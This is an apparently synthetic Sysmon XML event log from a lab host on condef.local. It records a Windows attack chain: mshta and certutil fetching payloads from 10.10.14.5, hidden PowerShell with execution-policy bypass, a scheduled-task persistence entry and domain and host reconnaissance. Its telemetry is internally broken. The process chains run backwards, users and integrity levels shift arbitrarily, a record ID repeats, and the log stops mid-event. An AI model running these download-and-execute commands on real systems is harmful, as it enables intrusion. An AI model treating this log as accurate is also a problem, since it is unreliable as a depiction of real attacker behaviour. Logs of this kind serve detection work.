<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:27.0000000Z" />
      <EventRecordID>5022</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:27.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0021-000000000c00}</Data>
      <Data Name="ProcessId">6021</Data>
      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">svchost.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">svchost.exe</Data>
      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000001500000015000000150000001500000015,MD5=00000015000000150000001500000015,SHA256=0000001500000015000000150000001500000015000000150000001500000015,IMPHASH=00000015000000150000001500000015</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0021-000000000c00}</Data>
      <Data Name="ParentProcessId">5021</Data>
      <Data Name="ParentImage">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="ParentCommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:34.0000000Z" />
      <EventRecordID>5023</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:34.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0022-000000000c00}</Data>
      <Data Name="ProcessId">6022</Data>
      <Data Name="Image">C:\Windows\System32\rundll32.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">rundll32.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">rundll32.exe</Data>
      <Data Name="CommandLine">rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000001600000016000000160000001600000016,MD5=00000016000000160000001600000016,SHA256=0000001600000016000000160000001600000016000000160000001600000016,IMPHASH=00000016000000160000001600000016</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0022-000000000c00}</Data>
      <Data Name="ParentProcessId">5022</Data>
      <Data Name="ParentImage">C:\Windows\System32\mshta.exe</Data>
      <Data Name="ParentCommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:41.0000000Z" />
      <EventRecordID>5024</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:41.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0023-000000000c00}</Data>
      <Data Name="ProcessId">6023</Data>
      <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">mshta.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">mshta.exe</Data>
      <Data Name="CommandLine">mshta.exe http://10.10.14.5/payload.hta</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000001700000017000000170000001700000017,MD5=00000017000000170000001700000017,SHA256=0000001700000017000000170000001700000017000000170000001700000017,IMPHASH=00000017000000170000001700000017</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0023-000000000c00}</Data>
      <Data Name="ParentProcessId">5023</Data>
      <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
      <Data Name="ParentCommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:48.0000000Z" />
      <EventRecordID>5025</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:48.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0024-000000000c00}</Data>
      <Data Name="ProcessId">6024</Data>
      <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">wscript.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">wscript.exe</Data>
      <Data Name="CommandLine">wscript.exe //B C:\Users\Public\update.vbs</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000001800000018000000180000001800000018,MD5=00000018000000180000001800000018,SHA256=0000001800000018000000180000001800000018000000180000001800000018,IMPHASH=00000018000000180000001800000018</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0024-000000000c00}</Data>
      <Data Name="ParentProcessId">5024</Data>
      <Data Name="ParentImage">C:\Windows\System32\net.exe</Data>
      <Data Name="ParentCommandLine">net user administrator /domain</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:02:55.0000000Z" />
      <EventRecordID>5026</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:02:55.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0025-000000000c00}</Data>
      <Data Name="ProcessId">6025</Data>
      <Data Name="Image">C:\Windows\System32\net.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">net.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">net.exe</Data>
      <Data Name="CommandLine">net user administrator /domain</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000001900000019000000190000001900000019,MD5=00000019000000190000001900000019,SHA256=0000001900000019000000190000001900000019000000190000001900000019,IMPHASH=00000019000000190000001900000019</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0025-000000000c00}</Data>
      <Data Name="ParentProcessId">5025</Data>
      <Data Name="ParentImage">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="ParentCommandLine">ipconfig /all</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:02.0000000Z" />
      <EventRecordID>5027</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:02.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0026-000000000c00}</Data>
      <Data Name="ProcessId">6026</Data>
      <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">ipconfig.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">ipconfig.exe</Data>
      <Data Name="CommandLine">ipconfig /all</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000001A0000001A0000001A0000001A0000001A,MD5=0000001A0000001A0000001A0000001A,SHA256=0000001A0000001A0000001A0000001A0000001A0000001A0000001A0000001A,IMPHASH=0000001A0000001A0000001A0000001A</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0026-000000000c00}</Data>
      <Data Name="ParentProcessId">5026</Data>
      <Data Name="ParentImage">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="ParentCommandLine">tasklist /v</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:09.0000000Z" />
      <EventRecordID>5028</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:09.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0027-000000000c00}</Data>
      <Data Name="ProcessId">6027</Data>
      <Data Name="Image">C:\Windows\System32\tasklist.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">tasklist.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">tasklist.exe</Data>
      <Data Name="CommandLine">tasklist /v</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000001B0000001B0000001B0000001B0000001B,MD5=0000001B0000001B0000001B0000001B,SHA256=0000001B0000001B0000001B0000001B0000001B0000001B0000001B0000001B,IMPHASH=0000001B0000001B0000001B0000001B</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0027-000000000c00}</Data>
      <Data Name="ParentProcessId">5027</Data>
      <Data Name="ParentImage">C:\Windows\System32\reg.exe</Data>
      <Data Name="ParentCommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:16.0000000Z" />
      <EventRecordID>5029</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:16.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0028-000000000c00}</Data>
      <Data Name="ProcessId">6028</Data>
      <Data Name="Image">C:\Windows\System32\reg.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">reg.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">reg.exe</Data>
      <Data Name="CommandLine">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000001C0000001C0000001C0000001C0000001C,MD5=0000001C0000001C0000001C0000001C,SHA256=0000001C0000001C0000001C0000001C0000001C0000001C0000001C0000001C,IMPHASH=0000001C0000001C0000001C0000001C</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0028-000000000c00}</Data>
      <Data Name="ParentProcessId">5028</Data>
      <Data Name="ParentImage">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="ParentCommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:23.0000000Z" />
      <EventRecordID>5030</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:23.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0029-000000000c00}</Data>
      <Data Name="ProcessId">6029</Data>
      <Data Name="Image">C:\Windows\System32\schtasks.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">schtasks.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">schtasks.exe</Data>
      <Data Name="CommandLine">schtasks /create /tn Updater /tr C:\Users\Public\upd.exe /sc onlogon</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=0000001D0000001D0000001D0000001D0000001D,MD5=0000001D0000001D0000001D0000001D,SHA256=0000001D0000001D0000001D0000001D0000001D0000001D0000001D0000001D,IMPHASH=0000001D0000001D0000001D0000001D</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0029-000000000c00}</Data>
      <Data Name="ParentProcessId">5029</Data>
      <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:30.0000000Z" />
      <EventRecordID>5031</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:30.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0030-000000000c00}</Data>
      <Data Name="ProcessId">6030</Data>
      <Data Name="Image">C:\Windows\explorer.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">explorer.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">explorer.exe</Data>
      <Data Name="CommandLine">C:\Windows\Explorer.EXE</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Low</Data>
      <Data Name="Hashes">SHA1=0000001E0000001E0000001E0000001E0000001E,MD5=0000001E0000001E0000001E0000001E,SHA256=0000001E0000001E0000001E0000001E0000001E0000001E0000001E0000001E,IMPHASH=0000001E0000001E0000001E0000001E</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0030-000000000c00}</Data>
      <Data Name="ParentProcessId">5030</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:37.0000000Z" />
      <EventRecordID>5032</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:37.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0031-000000000c00}</Data>
      <Data Name="ProcessId">6031</Data>
      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">cmd.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">cmd.exe</Data>
      <Data Name="CommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\jsmith</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">System</Data>
      <Data Name="Hashes">SHA1=0000001F0000001F0000001F0000001F0000001F,MD5=0000001F0000001F0000001F0000001F,SHA256=0000001F0000001F0000001F0000001F0000001F0000001F0000001F0000001F,IMPHASH=0000001F0000001F0000001F0000001F</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0031-000000000c00}</Data>
      <Data Name="ParentProcessId">5031</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="ParentUser">CONDEF\jsmith</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:38.0000000Z" />
      <EventRecordID>5034</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:38.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0031-000000000c00}</Data>
      <Data Name="ProcessId">6031</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="DestinationIp">10.10.14.5</Data>
      <Data Name="DestinationPort">443</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:44.0000000Z" />
      <EventRecordID>5034</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:44.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0032-000000000c00}</Data>
      <Data Name="ProcessId">6032</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">powershell.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">powershell.exe</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -ep bypass</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\svc_backup</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=0000002000000020000000200000002000000020,MD5=00000020000000200000002000000020,SHA256=0000002000000020000000200000002000000020000000200000002000000020,IMPHASH=00000020000000200000002000000020</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-0032-000000000c00}</Data>
      <Data Name="ParentProcessId">5032</Data>
      <Data Name="ParentImage">C:\Windows\System32\certutil.exe</Data>
      <Data Name="ParentCommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="ParentUser">CONDEF\svc_backup</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:03:51.0000000Z" />
      <EventRecordID>5035</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="UtcTime">2024-12-01 16:03:51.000</Data>
      <Data Name="ProcessGuid">{f3565dc0-8a1a-674c-0033-000000000c00}</Data>
      <Data Name="ProcessId">6033</Data>
      <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">certutil.exe</Data>
      <Data Name="Product">Microsoft(R) Windows(R) Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://10.10.14.5/payload.exe payload.exe</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
